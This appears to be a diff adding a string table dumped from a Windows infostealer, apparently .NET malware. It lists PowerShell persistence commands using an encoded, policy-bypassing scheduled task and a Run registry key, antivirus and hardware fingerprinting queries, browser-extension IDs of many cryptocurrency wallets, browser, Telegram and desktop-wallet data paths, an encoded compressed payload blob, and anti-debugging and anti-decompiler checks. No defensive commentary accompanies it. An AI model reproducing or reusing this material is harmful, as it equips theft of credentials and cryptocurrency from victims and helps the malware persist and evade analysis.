@@ -1,0 +1,145 @@
+{0}d {1}h {2}m {3}s
+-1
+powershell.exe
+-NoProfile -ExecutionPolicy Bypass -Enc 
+Register-ScheduledTask -TaskName '
+' -Action (New-ScheduledTaskAction -Execute '
+') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -User $env:UserName -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Force
+') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -User $env:UserName -RunLevel Highest -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Force
+Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '
+';New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '
+' -Value '"
+"' -PropertyType 'String'
+microsoft.powershell
+Software\
+Win32_PhysicalMemory
+SerialNumber
+Win32_DiskDrive
+Win32_Processor
+ProcessorId
+N/A
+displayName
+, 
+root\SecurityCenter2
+SELECT * FROM AntiVirusProduct
+[
+]
+Unknown
+Unknown OS
+Windows Server 2019
+Windows 10
+11
+Windows 11
+2019
+Windows Server 2016
+Windows Server 2022
+Windows 8
+7
+Windows 7
+2022
+10
+2012
+SELECT Caption FROM Win32_OperatingSystem
+Caption
+8
+Windows 8.1
+2016
+8.1
+Windows Server 2012
+ {0}Bit
+SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')
+ibnejdfjmmkpcnlpebklmnkoeoihofec
+TronLink
+nkbihfbeogaeaoehlefnkodbefgpgknn
+MetaMask
+fhbohimaelbohpjbbldcngcnapndodjp
+Binance Chain Wallet
+hpglfhgfnhbgpjdenjgmdgoeiappafln
+Guarda
+aholpfdialjgjfhomihkjbmgjidlcdno
+Exodus Web3
+jiidiaalihmmhddjgbnbgdfflelocpak
+BitKeep
+hnfanknocfeofbddgcijnmhnfnkdnaad
+Coinbase Wallet
+egjidjbpglichdcondbcbdnbeeppgdph
+Trust Wallet
+bfnaelmomeimhlpmgjnjophhpkkoljpa
+Phantom
+hfljlochmlccoobkbcgpmkpjagogcgpk
+Solana Wallet
+dmkamcknogkgcdfhhbddcghachkejeap
+Keplr
+fnjhmkhhmkbjkkabndcnnogagogbneec
+Ronin Wallet
+ejbalbakoplchlghecdalmeeeajnimhm
+ghocjofkdpicneaokfekohclmkfmepbp
+heaomjafhiehddpnmncmhhpjaloainkn
+hkkpjehhcnhgefhbdcgfkeegglpjchdc
+Braavos Smart Wallet
+akoiaibnepcedcplijmiamnaigbepmcb
+Yoroi
+djclckkglechooblngghdinmeemkbgci
+acdamagkdfmpkclpoglgnbddngblgibo
+Guarda Wallet
+okejhknhopdbemmfefjglkdfdhpfmflg
+mijjdbgpgbflkaooedaemnlciddmamai
+Waves Keeper
+Chromium\User Data\
+Chromium
+Google\Chrome\User Data\
+Chrome
+Google(x86)\Chrome\User Data\
+BraveSoftware\Brave-Browser\User Data\
+Brave
+Microsoft\Edge\User Data\
+Edge
+Telegram Desktop
+Telegram.exe
+Telegram
+Exodus
+exodus.wallet
+Ethereum
+GIU_XC^I
+keystore
+*
+foxmail
+Foxmail
+atomic
+Local Storage
+$->-$,*
+leveldb
+Atomic Wallet
+Electrum
+wallets
+Zcash
+com.liberty.jaxx
+IndexedDB
+Jaxx
+Software\Litecoin\Litecoin-Qt
+strDataDir
+Litecoin-Qt
+Software\Bitcoin\Bitcoin-Qt
+Bitcoin-Qt
+Software\Dash\Dash-Qt
+Dash-Qt
+ (x86)
+Ledger Live
+Ledger Live.exe
+:
+H4sIAAAAAAAACoWTOQrk6AFG8TR4sIeBjid0ZBC0ttJSzn5Jv/a1tJSkTPtaWktbncJnMfQBbB/BFzKdTjLxB48XvO9fP/3v17/+wjDfWPIbfqe/kV///f3L1/98//L1v9+//PbPXw1FgbTA8+DNV+BQOFApDrANk5ZinrGOZwj0DSoEpnvA5KpurrtGuh8YBxxMBAIIjIdxQCcSAscRBDCJxetRR0Pd50/xZvAgFDyFMITqMgXlMFpwGMEYCR/lML3ssASFMFpwGQI4n+0fsBSFV9rfO0ARAIsHFQt+7Hyl8aCCYAKPc6AbWY3DnIPhnBWVRxB1YvJANpm0oJQYIjia9+vj0+TVSbVgKKXJDxhHb80wGvxK8brGhQum6ntLOnV9MzbVgOZkQchMkkTuK/Lwbcc0h6umrecSPGVON97D05YWIhZEZizd8/Oy/YHZZeuB7JU3Jtk7lgi+KTQn3oD1UsxJ73hL2lnmFr9m0+JqrcoOAgqzG0zrJ69Cwl/v8e4K4k3YK0lVr6Fx/P5WPMtkTJa9JFbh0oY1vteh2yx+bCjBKcqfzilrJG+jJR139maaYYCjFap8riuuPmqHejw61lnUoX1vYPPsu1BNxnmGbUknqyu3IkEIFHWiWlQidf0RoUWRTMhZU2AJqZu8FBzFmqzioUP5TT1jd4QLnT1yi5vtE7hJUuMSGdsHBuEiyVnAW3Rjc5urulW/MKwlsPaAUwiw18LdtzRjs21lu9eAvMVmpKo9nolb9qDonk8WpqqnJQeedN5Ltz8Apk/QZWbq8u7FY5PGrc0yN8K5aA0L1POWfeIAaGkbgOgdPcJwteoVTTXBaO7uM3/VDytf71RzZAVrRRSabXqvk0v/YLCNrDr5Nb67++GdxKeUGfT1CaoVuqK/lvOOzIkK3Y0QKO8uq+kCzD0crK5uwkGdxhpoAdipsoRLyY+0mfPM1JGvUuzyHwVmOTao8HHdAZl7zoK9pbzo6ITlwQEBSIwfHzjkH+0/MIvjIijqTa9aZt9Thb0UUjeNBXkxQ/2WjNkArARwP4cH5NDDEQ1gcKBkD8GJVG2MlXrPTOBAk3OAUFUKB6QVr2ecOnP0I1laRx6qZ3i+bhZxR0gAJz/lOuz3w5oGESPv6fMaoTcMM0kiTop9pEMTnORVYHKzIDX3LLxQHHre3Qs9Hvtrs/L6AY76wEYkmkrXNTCTc4vMn1NkBIXI0JsenRYH8E0e1TKsqUNF8XMjkuZlcESpAVJHEBVJZdtoErmBHbQzjfReipUPNw2XdLogcuZWFK+Sv8ykHMs9j5640ZR8Jnen2RVBTg/HOqLOzWUPV0NKzcRcI1TafUJOEf3cEhCH7S64jaT4/kqE0oHrHAqUjRNQG/CEY0kH7Uukxvbo+yQDhD+ZoYsqXH9jb7EztvdDxmfNXZZFJtuUlNwbPEmqSJ/DxMD12oWpbtC+X3C/vmRNYk5fUuW2QHpbOQ++c4IkqA27fTzRECS6o7UvjU5hJlI8O59x1rJnrBYdHTzRy/cOvxDhTGPZu5gkrm1TwdIw3s4utpyVrdQZ/GjvVWxsqAD81DaVK/5QJNGF1lCM4GqH9Dw7V2Xtm3W3p+1lP2sSmjGBQr8MrBaPNVWgDDvattsZMM+L6acgFDRZSttkSCEWWdLBBFn5Ep34UJ+h8qDNFjqf95l1SLI+lsmr3hkueqgjBcUucQgSUpL67i5rUeqaZGjdhPhd6qNQk2/NgtpamjQEY9hP2Tl3i1VW7NMJyqJqQY822uLADZC+g/Oo+refhaJMtv799z/94y/LNrzIb8VZcD8D2xaAB9Q/x0OzrOv/AW0XYDvXBgAA
+4.4.3
+x2
+COR_ENABLE_PROFILING
+COR_PROFILER
+kernel32.dll
+CheckRemoteDebuggerPresent
+IsDebuggerPresent
+ntdll.dll
+NtQueryInformationProcess
+System.Diagnostics.Debugger
+IsAttached
+vsdbg
+de4dot
+dnspy
+debug
